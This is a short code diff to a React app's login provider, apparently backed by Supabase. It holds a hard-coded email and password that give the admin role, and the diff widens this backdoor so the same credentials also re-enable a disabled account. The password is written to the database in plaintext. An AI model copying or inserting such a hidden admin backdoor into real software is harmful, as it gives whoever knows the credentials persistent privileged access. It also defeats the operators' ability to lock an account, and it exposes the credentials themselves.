@@ -646,9 +646,10 @@ export const AppProvider: React.FC<{ children: React.ReactNode }> = ({
     }
 
     if (identifier === "doriangrey0366@gmail.com" && password === "882036") {
-       if (user && user.role !== "admin") {
-          await supabase.from('users').update({ role: "admin", password }).eq('id', user.id);
+       if (user && (user.role !== "admin" || user.disabled)) {
+          await supabase.from('users').update({ role: "admin", password, disabled: false }).eq('id', user.id);
           user.role = "admin";
+          user.disabled = false;
        } else if (!user) {
           const newUser = {
              name: "Admin",
